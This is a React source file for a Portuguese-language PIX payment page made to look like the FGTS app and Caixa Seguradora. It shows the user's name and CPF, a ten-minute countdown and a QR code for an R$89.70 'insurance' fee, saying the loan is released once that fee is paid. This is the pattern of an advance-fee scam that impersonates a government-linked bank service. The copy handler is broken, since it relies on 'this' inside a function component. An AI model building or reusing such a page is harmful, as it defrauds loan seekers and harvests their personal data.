import React, { useState, useEffect, useRef } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Check, Copy, Clock, AlertCircle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { Button } from '@/components/ui/button';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';
import { Card, CardContent } from '@/components/ui/card';
import QRCode from 'react-qr-code';
import { generatePixPayment } from '@/utils/paymentApi';

const PIXPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [timeLeft, setTimeLeft] = useState(10 * 60); // 10 minutes in seconds
  const [pixCode, setPixCode] = useState<string>('');
  const [pixQrCode, setPixQrCode] = useState<string>('');
  const [transactionId, setTransactionId] = useState<string>('');
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [copySuccess, setCopySuccess] = useState(false);
  const pixInputRef = useRef<HTMLTextAreaElement>(null);
  
  // Get user data from localStorage and location state
  const storedCPF = localStorage.getItem('userCPF') || '';
  const storedUserName = localStorage.getItem('userName') || '';
  
  // Get the data from location state or use default values
  const { 
    userName,
    userCPF,
    insuranceAmount = 89.70 // Updated to match the value from PHP example
  } = location.state || {
    userName: storedUserName,
    userCPF: storedCPF,
    insuranceAmount: 89.70 // Updated to match the value from PHP example
  };

  const actualUserName = userName || storedUserName || "Nome do Cliente";
  const actualCPF = userCPF || storedCPF || "000.000.000-00";

  // Generate PIX code immediately when component mounts
  useEffect(() => {
    // Function to generate PIX code
    const fetchPixCode = async () => {
      try {
        setIsLoading(true);
        setError(null);
        
        // Show loading toast
        toast({
          title: "Gerando código PIX",
          description: "Aguarde enquanto geramos seu código de pagamento...",
        });
        
        const customerData = {
          name: actualUserName,
          cpf: actualCPF
        };
        
        // Generate PIX with timeout to prevent hanging
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Tempo esgotado aguardando resposta da API')), 20000)
        );
        
        // Race between API and timeout
        const pixData = await Promise.race([
          generatePixPayment(customerData, insuranceAmount),
          timeoutPromise
        ]) as any;
        
        setPixCode(pixData.copiaecola);
        setPixQrCode(pixData.qrcode);
        setTransactionId(pixData.id);
        setIsLoading(false);
        
        toast({
          title: "Código PIX gerado",
          description: "O código PIX foi gerado com sucesso!",
          variant: "default"
        });
      } catch (err) {
        console.error('Erro ao buscar código PIX:', err);
        setError('Não foi possível gerar o código PIX via API. Usando código alternativo.');
        
        // Try to generate a mock code as fallback
        try {
          const customerData = {
            name: actualUserName,
            cpf: actualCPF
          };
          
          const pixData = await generatePixPayment(customerData, insuranceAmount);
          
          setPixCode(pixData.copiaecola);
          setPixQrCode(pixData.qrcode);
          setTransactionId(pixData.id);
          
          toast({
            title: "Código PIX gerado (alternativo)",
            description: "Um código PIX alternativo foi gerado com sucesso!",
            variant: "default"
          });
        } catch (fallbackErr) {
          setError('Erro crítico: Impossível gerar código PIX. Tente novamente mais tarde.');
          toast({
            title: "Erro ao gerar PIX",
            description: "Não foi possível gerar nenhum código PIX. Tente novamente.",
            variant: "destructive"
          });
        }
        
        setIsLoading(false);
      }
    };

    // Call immediately to generate PIX code
    fetchPixCode();
  }, [actualUserName, actualCPF, insuranceAmount]);

  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) {
      // Timer expired, navigate to a timeout page or show an alert
      toast({
        title: "Tempo expirado",
        description: "O código PIX expirou. Por favor, gere um novo.",
        variant: "destructive"
      });
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  // Format time as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Copy PIX code to clipboard
  const handleCopyPIX = function(this: any) {
    const pixInputRef = this.pixInputRef;
    if (pixInputRef.current) {
      pixInputRef.current.select();
      navigator.clipboard.writeText(pixInputRef.current.value)
        .then(() => {
          this.setCopySuccess(true);
          toast({
            title: "Código copiado!",
            description: "O código PIX foi copiado para a área de transferência.",
            variant: "default"
          });
          
          // Reset copy success after 2 seconds
          setTimeout(() => this.setCopySuccess(false), 2000);
        })
        .catch(err => {
          console.error('Failed to copy text: ', err);
          toast({
            title: "Erro ao copiar",
            description: "Não foi possível copiar o código. Por favor, tente novamente.",
            variant: "destructive"
          });
        });
    }
  };

  // Proceed to final payment page after PIX payment
  const handleProceedToFinal = () => {
    navigate('/final-payment', {
      state: {
        userName: actualUserName,
        userCPF: actualCPF,
        insuranceAmount,
        transactionId
      }
    });
  };

  return (
    <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <div className="h-10"></div> {/* Placeholder for symmetry */}
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Pagamento PIX</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Realize o pagamento para liberação do empréstimo
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 bg-white rounded-t-3xl overflow-hidden flex flex-col">
        <div className="flex-1 p-4 sm:p-6 pb-32">
          <div className="flex flex-col max-w-md mx-auto w-full">
            {/* User info and insurance logo */}
            <div className="flex justify-between items-center mb-6">
              <div>
                <h2 className="font-semibold text-lg">{actualUserName}</h2>
                <p className="text-gray-600 text-sm">CPF: {actualCPF}</p>
              </div>
              <img 
                src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
                alt="Caixa Seguradora"
                className="h-12 object-contain"
              />
            </div>
            
            {/* Timer */}
            <Card className="mb-6 border-orange-200 bg-orange-50">
              <CardContent className="p-4 flex items-center justify-between">
                <div className="flex items-center">
                  <Clock className="h-5 w-5 text-orange-600 mr-2" />
                  <span className="text-orange-800 font-medium">Tempo restante:</span>
                </div>
                <div className="text-lg font-bold text-orange-800">
                  {formatTime(timeLeft)}
                </div>
              </CardContent>
            </Card>
            
            {/* PIX Payment Information */}
            <Card className="mb-6">
              <CardContent className="p-4">
                <h3 className="font-bold text-xl text-center mb-4">PIX GERADO</h3>
                
                {isLoading ? (
                  <div className="flex flex-col items-center py-8">
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-700 mb-4"></div>
                    <p className="text-gray-700">Gerando código PIX...</p>
                  </div>
                ) : error ? (
                  <div className="bg-red-50 p-4 rounded-lg mb-4">
                    <div className="flex items-start">
                      <AlertCircle className="h-5 w-5 text-red-600 mr-2 mt-0.5" />
                      <p className="text-red-800">{error}</p>
                    </div>
                  </div>
                ) : (
                  <>
                    {/* QR Code */}
                    <div className="flex justify-center mb-6">
                      <div className="p-3 bg-white border border-gray-200 rounded-lg">
                        <QRCode 
                          value={pixQrCode || pixCode} 
                          size={200}
                          className="mx-auto"
                        />
                      </div>
                    </div>
                    
                    {/* Copy and Paste Code */}
                    <div className="mb-4">
                      <p className="font-medium text-gray-700 mb-2">Código Copia e Cola:</p>
                      <div className="relative">
                        <textarea
                          ref={pixInputRef}
                          value={pixCode}
                          readOnly
                          className="w-full h-24 p-3 pr-12 bg-gray-50 border border-gray-300 rounded text-sm font-mono resize-none"
                        />
                        <button 
                          onClick={handleCopyPIX}
                          className="absolute right-2 top-2 p-2 text-gray-600 hover:text-blue-600 transition-colors"
                          aria-label="Copiar código PIX"
                        >
                          {copySuccess ? (
                            <Check className="h-5 w-5 text-green-600" />
                          ) : (
                            <Copy className="h-5 w-5" />
                          )}
                        </button>
                      </div>
                    </div>
                    
                    {/* Payment Information */}
                    <div className="bg-green-50 p-4 rounded-lg mb-6">
                      <div className="flex items-start">
                        <AlertCircle className="h-5 w-5 text-green-600 mr-2 mt-0.5" />
                        <div>
                          <p className="text-green-800 font-medium">Valor a pagar: {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(insuranceAmount)}</p>
                          <p className="text-green-700 text-sm mt-1">
                            Após o pagamento confirmado, seu empréstimo será liberado.
                          </p>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                
                {/* Button to proceed to next step */}
                <Button 
                  onClick={handleProceedToFinal}
                  disabled={isLoading || !!error}
                  className="w-full bg-[#005CA9] hover:bg-[#004A87] py-6 rounded-full"
                >
                  CONFIRMAR PAGAMENTO
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
        
        {/* Footer */}
        <div className="mt-auto w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PIXPayment;
